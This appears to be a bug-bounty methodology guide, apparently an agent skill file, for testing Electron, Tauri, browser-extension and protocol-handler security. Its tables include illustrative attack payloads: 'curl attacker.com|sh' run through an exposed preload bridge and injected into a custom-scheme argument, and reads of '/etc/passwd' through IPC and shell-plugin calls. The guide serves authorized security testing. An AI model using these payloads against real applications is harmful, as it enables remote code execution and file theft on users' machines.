---
name: browser-desktop-security
description: Desktop application and browser extension security testing — Electron IPC bridges, Tauri command authorization, browser extension privilege escalation, custom protocol handlers, deep link hijacking, auto-updater abuse, and native messaging flaws. Use when testing Electron apps (Discord, VS Code, Slack, Notion, 1Password), Tauri apps, browser extensions, or any desktop software with a web-technology UI. Trigger on "Electron", "Tauri", "desktop app", "browser extension", "extension security", "nativeMessaging", "protocol handler", "deep link", "custom scheme", "preload script", "contextIsolation", "nodeIntegration", "IPC", "BrowserWindow", "webview tag", "auto-updater", "code signing". For web-page browser security (DOM XSS, CSP, CORS, postMessage), use client-side-security. For AI IDE-specific attacks (Claude Code, Cursor, Copilot), use ai-hunting/reference/ide-supply-chain.md. For mobile deep links, use mobile-security.
---

# Browser & Desktop Application Security Testing

Desktop apps built with web technologies (Electron, Tauri, CEF, NW.js) and browser extensions share a critical property: **web content sits adjacent to privileged bridges and system APIs**. XSS in a web page is Medium severity; the same XSS in an Electron app with a wide preload bridge is Critical RCE. Browser extensions with broad permissions create similar escalation paths — a misconfigured bridge turns a web vuln into a system vuln.

### Key CVEs & Real-World Examples

| CVE | Product | Type | CVSS |
|-----|---------|------|------|
| CVE-2026-0628 | Google Chrome | Insufficient policy enforcement in WebView tag — malicious extension injects into privileged page (requires user install) | 8.8 |
| CVE-2023-29198 | Electron (< 22.3.6, 23.x < 23.2.3, 24.x, 25.x) | Context isolation bypass via nested unserializable return value — requires `contextIsolation` + `contextBridge` | 6.0 |
| CVE-2018-1000136 | Electron (< 1.7.13, < 1.8.4, < 2.0.0-beta.4) | `nodeIntegration` re-enabled through `webview` tag when `nativeWindowOpen` + specific conditions met | 8.1 |
| CVE-2022-29247 | Electron | Compromised child renderer obtains IPC access without `nodeIntegrationInSubFrames` — exploitable if IPC handlers lack `senderFrame` validation | 5.5 |
| CVE-2026-28417 | Vim netrw plugin (< 9.2.0073) | OS command injection via crafted `scp://` URL in bundled netrw plugin | 4.4 |
| GHSA-57fm-592m-34r7 | Tauri (CVE-2024-35222) | Remote-origin iFrames access parent window's IPC endpoints without explicit capability grant (requires script exec in iframe) | 5.9 |
| CVE-2025-31477 | tauri-plugin-shell (< 2.2.1) | Improper protocol validation in `open` endpoint — allows `file://`, `smb://`, `nfs://` URLs | 9.8 |

### What Pays

| Bug Class | Typical Severity | Avg Payout Range | Duplicate Risk |
|-----------|-----------------|------------------|----------------|
| Electron XSS → RCE (wide preload bridge) | Critical | $5k–$50k | Low |
| Extension privilege escalation | High–Critical | $3k–$20k | Low |
| Deep link / protocol handler hijack | Medium–High | $1k–$10k | Low |
| Preload bridge over-exposure | High | $2k–$15k | Low |
| Auto-updater MITM / signature bypass | Critical | $5k–$30k | Very Low |
| Tauri IPC capability bypass | High | $2k–$10k | Very Low |
| nativeMessaging arbitrary command | High–Critical | $3k–$20k | Low |

---

## Scope Gate

Before investing time, verify the target is actually a desktop/extension target:

| Check | Action If Failed |
|-------|-----------------|
| App is Electron/Tauri/CEF/NW.js (check `navigator.userAgent`, process binary, `package.json`) | Route to client-side-security for web-only targets |
| Extension is in program scope (many exclude browser extensions) | Check program policy; extension-only vulns may be out of scope |
| Desktop app version is current (not EOL) | EOL desktop apps are often excluded; check program policy |
| Protocol handler is registered by the in-scope app (not OS default) | Only test handlers registered by the target application |

---

## 1. Electron Application Security

Electron apps bundle Chromium + Node.js. The attack model is: **find web-content injection (XSS, navigation, protocol handler) → escalate through the Electron bridge to Node.js/OS access**.

### 1.1 Security Configuration Audit

Check every `BrowserWindow`, `BrowserView`, and `<webview>` tag for these settings:

| Setting | Secure Value | Risk If Wrong |
|---------|-------------|---------------|
| `nodeIntegration` | `false` | Any XSS = full RCE with Node.js access |
| `contextIsolation` | `true` | Renderer JS can override preload-exposed functions — collapses page/preload boundary |
| `sandbox` | `true` | Preload has direct Node.js access without sandbox |
| `webSecurity` | `true` | SOP disabled — cross-origin reads from `file://` |
| `allowRunningInsecureContent` | `false` | HTTP content loaded in HTTPS context → MITM injection |
| `enableRemoteModule` | `false` (deprecated) | `remote.require()` gives renderer full Node.js access |
| `nodeIntegrationInWorker` | `false` | Web Workers get Node.js access |
| `nodeIntegrationInSubFrames` | `false` | Iframes get Node.js access — one XSS in embedded content = RCE |

**Testing procedure:**
1. Extract `app.asar` — `npx asar extract app.asar app/`
2. Search for `new BrowserWindow(` and dump all `webPreferences` objects
3. Runtime check: inject `require('child_process').exec('id')` in DevTools console. If it works → `nodeIntegration: true`
4. Check `contextIsolation`: run `win.webContents.getLastWebPreferences()` from main process, or check if `window.electron` / Node globals leak into page context

### 1.2 Preload Script Bridge Audit

Even with `nodeIntegration: false` + `contextIsolation: true`, the preload script is the authorized bridge between renderer and main process. Over-exposed bridges are the #1 Electron attack vector.

**Dangerous patterns:**

| Pattern | Risk | Example |
|---------|------|---------|
| `contextBridge.exposeInMainWorld('api', { exec: (cmd) => ... })` | Direct command execution | XSS → `window.api.exec('curl attacker.com\|sh')` |
| Wide `ipcRenderer.send()` / `ipcRenderer.invoke()` exposure | Attacker calls any IPC channel | XSS → `window.api.send('file:read', '/etc/passwd')` |
| Preload passes unsanitized args to main process | Injection through IPC arguments | Path traversal in file-read IPC handler |
| `shell.openExternal(url)` without URL validation | `file://` or `smb://` URL opens local resources | Navigation to `file:///etc/passwd` |
| Preload re-exports `require` or Node globals | Full Node.js access from renderer | `window.nodeRequire('child_process')` |

**Testing procedure:**
1. Read all preload scripts (usually `preload.js` or `preload.ts` in the asar)
2. List every `contextBridge.exposeInMainWorld()` call — these are the attack surface
3. For each exposed method, trace the IPC handler in the main process
4. **Check IPC sender validation** — does the handler verify `event.senderFrame` or `event.sender`? Missing validation lets compromised renderers call privileged IPC channels (CVE-2022-29247 pattern)
5. Test: can you reach OS-level operations (file read/write, command exec, network) through the bridge?
6. Test argument injection: if a bridge method takes a path, try `../../etc/passwd`

### 1.3 Navigation & Protocol Handler Attacks

| Vector | Test | Impact |
|--------|------|--------|
| `window.open()` / `<a>` navigation | Does new window inherit insecure webPreferences? | New window with `nodeIntegration: true` |
| Custom protocol (`myapp://`) | Register competing handler, test if app validates origin | Protocol handler hijack → credential theft |
| `shell.openExternal()` | Inject `file://`, `smb://`, `\\\\host\\share` URLs | Local file access, NTLM hash leak |
| `webview` tag injection | If app renders attacker HTML with `<webview>` | Independent renderer — check `will-attach-webview` handler enforces restrictions |
| `will-navigate` / `will-redirect` handler | Does app restrict navigation to trusted origins only? | Unrestricted navigation allows loading attacker-controlled content |

### 1.4 Auto-Updater Security

| Check | Risk | Test |
|-------|------|------|
| Update URL is HTTP (not HTTPS) | MITM → malicious update binary | Intercept update check, serve crafted response |
| No signature verification | Attacker replaces update binary | Modify update payload, check if app installs it |
| `autoUpdater.setFeedURL()` controllable | Redirect updates to attacker server | If URL comes from config file or environment variable |
| Update differential (delta) without integrity check | Patch binary with malicious code | Modify delta payload |

---

## 2. Tauri Application Security

Tauri v2 uses a capability-based permission system instead of Tauri v1's allowlist. The attack model: **frontend web content → IPC invoke → authorized Tauri command → system access**.

### 2.1 Capability & Permission Audit

| Check | Risk | Test |
|-------|------|------|
| Overly broad capabilities in `capabilities/*.json` | Frontend can access unintended system APIs | Review each capability file; check for `core:default` or wildcard scopes |
| iFrame origin bypass (GHSA-57fm-592m-34r7) | Remote-origin iFrame accesses parent's IPC endpoints (requires script exec in iframe) | Load untrusted iframe, call `window.__TAURI_INTERNALS__.invoke()` |
| `plugin-shell` `open` without protocol validation (CVE-2025-31477) | Dangerous protocols (`file://`, `smb://`) not blocked | `invoke('plugin:shell\|open', { path: 'file:///etc/passwd' })` — affects < 2.2.1 |
| `shell:allow-execute` with untrusted input | If command runs through shell (not direct argv), metachar injection | Test if command uses shell parsing vs. direct exec — only shell-parsed commands are injectable |
| File system scope too broad (`$HOME/**`) | Read/write arbitrary user files | Request files outside intended app directory |

### 2.2 IPC Command Testing

1. List all `#[tauri::command]` handlers in Rust source (or check `tauri.conf.json` plugins)
2. For each command, check if it validates inputs before passing to system APIs
3. Test: call commands directly from DevTools console via `window.__TAURI_INTERNALS__.invoke('command_name', { args })`
4. Check if commands enforce user authorization (multi-user apps) or just rely on capability grants

---

## 3. Browser Extension Security

Extensions run with elevated browser privileges. A low-permission extension that can inject into a high-privilege context (as demonstrated by CVE-2026-0628, where a malicious extension exploited Chrome's WebView tag policy to access the Gemini panel) creates a critical escalation path.

### 3.1 Manifest & Permission Audit

| Permission | Risk Level | Attack Surface |
|-----------|------------|----------------|
| `<all_urls>` or `*://*/*` host permission | Critical | Content script injection on every page — XSS in extension = universal XSS |
| `nativeMessaging` | Critical | Extension communicates with native binary — message injection → command execution |
| `webRequest` / `declarativeNetRequest` | High | Intercept/modify all HTTP traffic — credential theft, request manipulation |
| `tabs` | Medium | Read URLs and titles of all tabs — privacy leak, session tracking |
| `cookies` | High | Read/write cookies for any domain with host permission — session hijacking |
| `storage` (with `unlimitedStorage`) | Medium | Exfiltrate large data sets to extension storage |
| `debugger` | Critical | Full DevTools protocol access — read/modify any page content |
| `management` | High | Enable/disable other extensions — disable security extensions |

### 3.2 Content Script Isolation

Content scripts share the DOM with the web page but have a separate JavaScript execution context. **Isolation fails when:**

| Failure Mode | Test | Impact |
|-------------|------|--------|
| Content script reads DOM data set by page JS | Page poisons DOM element, content script trusts it | Data injection into extension logic |
| Content script uses `eval()` or `innerHTML` with page data | Inject via DOM manipulation | Code execution in content script context |
| Content script sends page-controlled data to background | Page crafts malicious DOM content → content script relays it | Privilege escalation to background page |
| `externally_connectable` too broad | `"matches": ["*://*.example.com/*"]` — any subdomain can message extension | Compromised subdomain → extension control |
| `web_accessible_resources` over-exposed | Extension pages/scripts accessible from any web origin | Fingerprinting, XSS in extension pages, or resource abuse |

### 3.3 Message Passing Attack Surface

| Channel | Direction | Risk |
|---------|-----------|------|
| `chrome.runtime.sendMessage()` | Content → Background | If background acts on unvalidated messages → privilege escalation |
| `chrome.runtime.onMessageExternal` | Web page → Background | If `externally_connectable` allows attacker origins |
| `chrome.runtime.connectNative()` | Extension → Native app | Message format injection → native app command execution |
| `window.postMessage()` | Page ↔ Content script | Content script listens without origin validation |

**Testing procedure:**
1. Read `manifest.json` — list all permissions, content scripts, background scripts, externally_connectable
2. Search for `onMessage`, `onMessageExternal`, `onConnect`, `connectNative` handlers
3. Test: send crafted messages from a web page to the extension (if externally connectable)
4. Test: manipulate DOM elements that content scripts read
5. Check native messaging host manifest — does it validate the calling extension ID?

---

## 4. Custom Protocol Handlers & Deep Links

Desktop apps register custom URI schemes (`myapp://`, `vscode://`, `discord://`). These are attack surface because **any website can trigger navigation to a custom protocol**.

### 4.1 Protocol Handler Attack Patterns

| Attack | Mechanism | Impact |
|--------|-----------|--------|
| Argument injection | `myapp://action?file=../../etc/passwd` | Path traversal through protocol handler |
| Command injection | `myapp://run?cmd=;curl+attacker.com\|sh` | Shell command execution if handler passes to shell |
| Protocol handler hijack | Register a competing handler for same scheme | Intercept credentials or tokens sent via protocol |
| OAuth token interception | `myapp://callback?code=AUTH_CODE` — competing app steals code | Account takeover via stolen OAuth code |
| SSRF via protocol | App fetches URL from protocol argument server-side | Internal network access |

### 4.2 Testing Procedure

1. **Enumerate handlers** — Check app's `Info.plist` (macOS), registry keys (Windows `HKCR`), `.desktop` files (Linux) for registered schemes
2. **Test from browser** — Create a page with `<a href="myapp://test">` and click it. Does the app handle it? What arguments does it accept?
3. **Argument fuzzing** — Inject path traversal (`../`), shell metacharacters (`;`, `|`, `` ` ``), URL-encoded payloads into protocol arguments
4. **Competing handler** — Register a second app for the same scheme. Handler resolution is OS-version and user-default dependent (Windows may show a chooser, macOS uses Launch Services priority, Linux uses `xdg-open` defaults)
5. **OAuth flow** — If the app uses protocol handlers for OAuth callbacks, test if another app can register the same scheme and steal the authorization code

---

## Common Report Killers

| Looks Like a Bug | Why It Usually Isn't |
|---|---|
| `nodeIntegration: true` in dev-only window | If it's truly dev-only and never loads remote content — informational |
| Extension requests `<all_urls>` | Permission request alone isn't a vuln — show exploitation (data theft, injection) |
| App uses HTTP for non-sensitive resources | Only a finding if interceptable resources lead to code execution or credential theft |
| Protocol handler accepts arguments | Only a finding if arguments reach dangerous sinks (shell, file system, navigation) |
| asar extraction reveals source code | Source code access is by design in Electron — only report if secrets/credentials found |
| Auto-updater checks HTTP endpoint | Assess full chain: control-channel compromise, manifest tampering, downgrade attacks, and unsigned binaries all matter |
| Extension content script can read page DOM | This is expected behavior — only report if it leads to privilege escalation |

---

## Methodology: Desktop App Testing Flow

```
1. IDENTIFY: Determine framework (Electron/Tauri/CEF/NW.js/extension)
   - Electron: check for app.asar, package.json, Electron user agent
   - Tauri: check for tauri.conf.json, __TAURI_INTERNALS__
   - Extension: read manifest.json from extension directory
2. EXTRACT: Get source code
   - Electron: npx asar extract app.asar app/
   - Tauri: decompile frontend assets from binary
   - Extension: chrome://extensions → load unpacked or extract .crx
3. AUDIT CONFIG: Check security settings (Section 1.1/2.1/3.1)
4. MAP BRIDGE: List all IPC channels, exposed APIs, message handlers
5. TRACE FLOWS: For each bridge method, trace from renderer to main/native
6. INJECT: Test web-content injection points (XSS, navigation, protocol handler)
7. ESCALATE: Chain web injection → bridge abuse → OS-level impact
8. VALIDATE: Confirm the full chain works with fresh install + default config
```

### Chaining Matrix — Escalate Findings

| Finding A | + Finding B | = Impact | Severity |
|-----------|------------|----------|----------|
| XSS in Electron renderer | Wide preload bridge (`exec`, `readFile`) | RCE | Critical |
| XSS in Electron renderer | `contextIsolation: false` + dangerous preload exposure | Override preload functions → privileged API access | Critical |
| Extension content script injection | Background page acts on messages | Extension privilege escalation | High |
| Protocol handler argument injection | Handler passes args to shell | Command execution | Critical |
| DOM manipulation | Content script reads poisoned DOM | Data injection into extension | High |
| Tauri iFrame origin bypass | Parent has broad capabilities | Unauthorized system API access | High |
| Auto-updater HTTP feed | No signature verification | Malicious update delivery | Critical |

---

## Validation Gate — Is This Submittable?

Before writing the report, check these desktop-specific false positives:

1. **Full chain required** — XSS alone in an Electron app is not RCE. You must demonstrate the escalation through the bridge/config to OS-level impact
2. **Default configuration** — Does the vuln exist in a default install, or only with custom developer settings?
3. **User interaction budget** — Protocol handler attacks require user to click a link. One-click is acceptable; complex multi-step chains get downgraded
4. **Extension scope** — Many programs explicitly exclude browser extension vulns. Verify before investing time
5. **Version check** — Electron version matters. Many old vulns (`nodeIntegration` re-enable, `contextIsolation` bypass) are fixed in modern Electron. Check `process.versions.electron`

---

## Tools

| Tool | Use Case |
|------|----------|
| **Electronegativity** (Doyensec) | Static analysis of Electron security misconfigurations |
| **electron-debug** | Enable DevTools in production Electron apps |
| **asar** | Extract and repack Electron app archives |
| **CRXcavator** / **Extension Analyzer** | Automated browser extension security analysis |
| **Tauri CLI** | Inspect Tauri app capabilities and permissions |
| **Process Monitor** (Windows) / **dtrace** (macOS) | Trace protocol handler registrations and file access |
| **Frida** | Runtime hooking for desktop app API interception |
| **mitmproxy** | Intercept auto-updater traffic and protocol handler requests |
